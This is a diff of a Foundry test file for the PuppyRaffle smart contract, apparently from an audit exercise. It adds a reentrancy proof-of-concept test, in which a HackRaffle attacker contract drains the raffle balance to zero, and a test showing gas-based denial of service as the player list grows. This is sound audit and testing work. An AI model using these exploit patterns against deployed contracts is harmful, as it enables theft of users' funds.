@@ -231,13 +231,48 @@ contract PuppyRaffleTest is Test {
     // }
 
     // test to check ReEntrancy. Works, sort of.
-    // function testHackRaffle() public playersEntered {
-    //     uint256 startingRaffleBalance = address(puppyRaffle).balance;
-    //     HackRaffle hackRaffle = new HackRaffle{value: entranceFee}(address(puppyRaffle));
-    //     hackRaffle.enter();
-    //     hackRaffle.hackRefund();
-    //     uint256 endingRaffleBalance = address(puppyRaffle).balance;
-    //     // assert(address(puppyRaffle).balance ==  0);
-    //     assert((startingRaffleBalance - endingRaffleBalance) > entranceFee);
-    // }
+    function testHackRaffle() public {
+        // players entering the raffle
+        uint256 playersNum = 510;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        console.log("Total number of players before Reentrancy: ", players.length);
+        // ReEntrancy Begins
+        uint256 startingRaffleBalance = address(puppyRaffle).balance;
+        console.log("Raffle contract balance before Reentrancy: ", startingRaffleBalance);
+        HackRaffle hackRaffle = new HackRaffle{value: entranceFee}(address(puppyRaffle));
+        hackRaffle.enter();
+        hackRaffle.hackRefund();
+        uint256 endingRaffleBalance = address(puppyRaffle).balance;
+        console.log("Raffle contract balance after Reentrancy: ", endingRaffleBalance);
+        // assert(address(puppyRaffle).balance < entranceFee);
+        assert(endingRaffleBalance == 0);
+        // assert((startingRaffleBalance - endingRaffleBalance) > entranceFee);
+    }
+
+    // Denial of Service Test
+    function test_DenialOfService() public {
+        uint256 playersNum = 1000;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        uint256 startGas = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        uint256 endGas = gasleft();
+        uint256 gasForFirstBatch = startGas - endGas;
+        console.log("Gas for 1st batch: ", gasForFirstBatch);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i + playersNum);
+        }
+        startGas = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        endGas = gasleft();
+        uint256 gasForSecondBatch = startGas - endGas;
+        console.log("Gas for 2nd batch: ", gasForSecondBatch);
+        assert(gasForSecondBatch > gasForFirstBatch);
+    }
 }
